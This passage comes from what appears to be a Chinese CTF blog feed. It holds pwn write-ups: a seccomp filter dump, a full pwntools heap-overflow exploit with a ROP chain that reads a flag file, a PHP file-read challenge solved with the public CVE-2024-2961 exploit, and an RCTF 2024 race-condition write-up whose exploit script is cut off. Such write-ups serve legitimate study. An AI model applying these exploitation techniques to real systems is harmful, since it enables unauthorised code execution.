0032<br> 0008: 0x15 0x17 0x00 0x0000003b  if (A == execve) goto 0032<br> 0009: 0x15 0x16 0x00 0x0000003e  if (A == kill) goto 0032<br> 0010: 0x15 0x15 0x00 0x00000052  if (A == rename) goto 0032<br> 0011: 0x15 0x14 0x00 0x00000054  if (A == rmdir) goto 0032<br> 0012: 0x15 0x13 0x00 0x00000057  if (A == unlink) goto 0032<br> 0013: 0x15 0x12 0x00 0x0000005a  if (A == chmod) goto 0032<br> 0014: 0x15 0x11 0x00 0x0000005b  if (A == fchmod) goto 0032<br> 0015: 0x15 0x10 0x00 0x0000005c  if (A == chown) goto 0032<br> 0016: 0x15 0x0f 0x00 0x0000005d  if (A == fchown) goto 0032<br> 0017: 0x15 0x0e 0x00 0x00000065  if (A == ptrace) goto 0032<br> 0018: 0x15 0x0d 0x00 0x00000069  if (A == setuid) goto 0032<br> 0019: 0x15 0x0c 0x00 0x0000006a  if (A == setgid) goto 0032<br> 0020: 0x15 0x0b 0x00 0x00000071  if (A == setreuid) goto 0032<br> 0021: 0x15 0x0a 0x00 0x00000072  if (A == setregid) goto 0032<br> 0022: 0x15 0x09 0x00 0x00000075  if (A == setresuid) goto 0032<br> 0023: 0x15 0x08 0x00 0x00000077  if (A == setresgid) goto 0032<br> 0024: 0x15 0x07 0x00 0x0000009d  if (A == prctl) goto 0032<br> 0025: 0x15 0x06 0x00 0x000000c8  if (A == tkill) goto 0032<br> 0026: 0x15 0x05 0x00 0x000000ea  if (A == tgkill) goto 0032<br> 0027: 0x15 0x04 0x00 0x00000104  if (A == fchownat) goto 0032<br> 0028: 0x15 0x03 0x00 0x00000107  if (A == unlinkat) goto 0032<br> 0029: 0x15 0x02 0x00 0x0000010c  if (A == fchmodat) goto 0032<br> 0030: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0032<br> 0031: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0032: 0x06 0x00 0x00 0x00000000  return KILL<br></code></pre></td></tr></table></figure></li><li><p>漏洞点在convert，convert申请了一个4倍size的chunk但用的还是原来那个</p></li><li><p>由于是字符集转换猜测使用中文，尝试发现一个中文在转换后会有5字节溢出，可以改next chunk的size</p></li></ul><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p>其实挺简单的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x290</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x318</span>,<span class="hljs-string">&#x27;烫&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x310</span>+<span class="hljs-string">b&#x27;\x11\x05&#x27;</span>)  <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x300</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 6</span><br>convert(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 4</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xc11</span>))<br>delete(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content:&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>libcbase=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x203b20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64(libcbase+<span class="hljs-number">0x203b20</span>)*<span class="hljs-number">2</span><br>payload+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0x20</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">4</span>,payload)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 7</span><br>delete(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content:&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x210</span>)<br>heap=(u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x5000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5</span><br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64(((heap+<span class="hljs-number">0x5000</span>)&gt;&gt;<span class="hljs-number">12</span>)^(libcbase+<span class="hljs-number">0x20ad20</span>)))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)  <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x38</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>) <span class="hljs-comment"># 7</span><br>show(<span class="hljs-number">7</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;content:&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>)<br>stack=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>))<br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 8</span><br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment"># 9</span><br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x211</span>)+p64(((heap+<span class="hljs-number">0x5000</span>)&gt;&gt;<span class="hljs-number">12</span>)^(stack-<span class="hljs-number">0x198</span>)))<br>add(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;./flag\x00&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>open_addr=libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]+libcbase<br>read_addr=libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]+libcbase<br>puts_addr=libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]+libcbase<br>ret=libcbase+<span class="hljs-number">0x2882f</span><br>rdi=libcbase+<span class="hljs-number">0x10f75b</span><br>rsi=libcbase+<span class="hljs-number">0x110a4d</span><br>rcx=libcbase+<span class="hljs-number">0xa876e</span><br>rdx=libcbase+<span class="hljs-number">0xab891</span><br>rop=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(rdi)+p64(heap+<span class="hljs-number">0x5a40</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>rop+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(heap)+p64(rcx)+p64(heap+<span class="hljs-number">0x100</span>)+p64(rdx)+p64(<span class="hljs-number">0x30</span>)+p64(read_addr)<br>rop+=p64(rdi)+p64(heap)+p64(puts_addr)<br>add(<span class="hljs-number">0x200</span>,rop)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>平台开了后看到有个php题火速趁收手机的最后一分钟clone了一份php源码，结果这题看都没看一眼，<em>而且这题有源码也没啥用</em></p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p><em>赛时提到iconv的时候z神就提到了这个CVE，结果iconv那题不用这个CVE但php题用，z神yyds🐂</em></p><ul><li><p>nginx的配置文件，主要是找端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/nginx/sites-available/default</span><br><br>server &#123;<br>    listen 9999 default_server;<br>    listen [::]:9999 default_server;<br><br>    root /var/www/html;<br><br>    index index.html;<br><br>    server_name _;<br><br>    location / &#123;<br>        try_files $uri $uri/ /index.html;<br>    &#125;<br><br>    location ~ \.php$ &#123;<br>        fastcgi_split_path_info ^(.+\.php)(/.+)$;<br>        fastcgi_pass unix:/var/run/php/php8.3-fpm.sock;<br>        fastcgi_index index.php;<br>        include fastcgi_params;<br>        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;<br>        fastcgi_param PATH_INFO $fastcgi_path_info;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>服务，一个文件读取系统</p><img src="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/html.png" class title="html"></li><li><p>data.php，主要注意交互有base64编码和AES加密，还有黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">base64_decode_data</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-comment">// AES加密和解密函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aes_encrypt</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$key</span></span>) </span>&#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$key</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$encrypted</span> = <span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;aes-256-cbc&#x27;</span>, <span class="hljs-variable">$key</span>, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<br>    <span class="hljs-variable">$encrypted</span> = <span class="hljs-variable">$iv</span> . <span class="hljs-variable">$encrypted</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$encrypted</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_blacklisted</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27;/root&#x27;</span>, <span class="hljs-string">&#x27;/home&#x27;</span>, <span class="hljs-string">&#x27;/media&#x27;</span>, <span class="hljs-string">&#x27;/mnt&#x27;</span>, <span class="hljs-string">&#x27;/lib64&#x27;</span>, <span class="hljs-string">&#x27;/lib&#x27;</span>]; <span class="hljs-comment">// 添加其他黑名单目录</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blacklisted_dir</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$path</span>), <span class="hljs-variable">$blacklisted_dir</span>) === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">// 获取Base64编码的文件路径并进行Base64解码</span><br><span class="hljs-variable">$encoded_file</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">base64_decode_data</span>(<span class="hljs-variable">$encoded_file</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_blacklisted</span>(<span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Access to this directory is not allowed.&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 获取文件内容</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><br><span class="hljs-comment">// 加密文件内容</span><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;Welcome_to_CISCN_2024_Final&#x27;</span>;  <span class="hljs-comment">// Actual key</span><br><span class="hljs-variable">$encrypted_data</span> = <span class="hljs-title function_ invoke__">aes_encrypt</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your encrypted file : <span class="hljs-subst">$encrypted_data</span>&quot;</span>;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>重点来了</strong></p><ul><li><p><a href="https://github.com/ambionics/cnext-exploits/">CVE-2024-2961</a>，有现成的exp，改一下交互和文件获取就可以</p></li><li><p>贴一张成功截图</p><img src="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/success1.png" class title="success1"><img src="/2024/07/29/2024%E5%9B%BD%E8%B5%9B%E5%86%B3%E8%B5%9Bpwn-wp/success2.png" class title="success2"></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 rctf pwn wp</title>
    <link href="/2024/05/28/2024rctfpwnwp/"/>
    <url>/2024/05/28/2024rctfpwnwp/</url>
    
    <content type="html"><![CDATA[<p>忙碌的半周……</p><p>周四出发去福州→周五铁三→周六酒店打rctf→周日返程+京麒（还延误了将近两个小时^V^）</p><p>铁三只出了签到，rctf做了两道题的前期准备工作，京麒零输出；最后铁三二等，京麒也进了（感谢队友orz），结果也算不错</p><p>某人又因为被蚊子咬过敏了^V^，还挺严重所以吃了过敏药，吃完整个人又呆又困，去福州之前右胳膊整个肿了，在福州又喜提三四口（一晚上被蚊子吓醒n次），回来之后胳膊好了，右脚踝肿了（肿的我室友以为我脚崴了），蚊子怎么还不灭绝(╯‵□′)╯︵┻━┻</p><span id="more"></span><h1 id="Taskgo"><a href="#Taskgo" class="headerlink" title="Taskgo"></a>Taskgo</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>race，比赛做的时候主要靠试，现在捋一下逻辑</p><p>base::TaskRunner::PostTask启动任务，一共两个线程</p><ul><li>MainThread（g_main_thread_task_runner）<ul><li>所有菜单</li><li>MagicCastle::SwitchHandle</li><li>MagicCastle::BuyMS，MagicCastle::DropMS，MagicCastle::LearnMS</li><li>FiveStar</li></ul></li><li>IOThread（g_io_thread_task_runner）<ul><li>RapidAdvance::PickHandle</li><li>RapidAdvance::StartRA</li><li>MagicHeld::Gods</li><li>Log</li><li>NoteStar</li></ul></li></ul><h3 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h3><ul><li>RapidAdvance和MagicCastle不是一个线程</li><li>CheckMoney会先sleep再结算</li><li>RapidAdvance的CheckMoney sleep卡住的时候可以调用BuyMS把钱刷成负数</li></ul><p>集齐三个MS就可以1337调用Gods获得system和BackDoor地址</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><ul><li><p>BuyMS中会申请一个结构体MagicHeld</p><img src="/2024/05/28/2024rctfpwnwp/vtable.png" class title="vtable"></li><li><p>DropMS中会调用MagicHeld::~MagicHeld把它释放掉</p><img src="/2024/05/28/2024rctfpwnwp/free.png" class title="free"></li><li><p>MagicHeld::Gods的参数也是MagicHeld（废废的一句话(lll￢ω￢)）</p><img src="/2024/05/28/2024rctfpwnwp/gods.png" class title="gods"><ul><li><p>利用MagicHeld输出Log的地址</p><img src="/2024/05/28/2024rctfpwnwp/printf.png" class title="printf"></li><li><p>调用Log</p><img src="/2024/05/28/2024rctfpwnwp/log.png" class title="log"></li></ul></li><li><p>RapidAdvance里买两次可以调用FiveStar和NoteStar留Comment</p></li></ul><p>所以可以通过race把MagicHeld free掉再通过Comment申请回来改掉，执行BackDoor</p><p>流程如下：</p><ul><li>Gods</li><li>DropMS</li><li>RapidAdvance两次，留Comment</li></ul><p><em>race &#x3D;&#x3D; 玄学</em></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choose</span>(<span class="hljs-params">idx</span>):<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    choose(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rapids</span>(<span class="hljs-params">s</span>):<br>    choose(<span class="hljs-number">1</span>)<br>    choose(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic_buy</span>(<span class="hljs-params">s</span>):<br>    choose(<span class="hljs-number">2</span>)<br>    choose(<span class="hljs-number">1</span>)<br>    choose(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic_drop</span>():<br>    choose(<span class="hljs-number">2</span>)<br>    choose(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">magic_learn</span>():<br>    choose(<span class="hljs-number">2</span>)<br>    choose(<span class="hljs-number">3</span>)<br><br><br>p=process(<span class="hljs-string">&#x27;./ctf&#x27;</span>)<br>name=<span class="hljs-string">b&#x27;flag&#x27;</span><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Hello, nice day. Player, please tell me your name: \n&#x27;</span>,name)<br>rapids(<span class="hljs-number">3</span>)<br>magic_buy(<span class="hljs-number">2</span>)<br>magic_learn()<br>magic_drop()<br>magic_buy(<span class="hljs-number">1</span>)<br>magic_learn()<br>magic_drop()<br>magic_buy(<span class="hljs-number">3</span>)<br>magic_learn()<br>choose(<span class="hljs-number">2</span>)<br>choose(<span class="hljs-number">1337</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>system=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>log=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>],<span 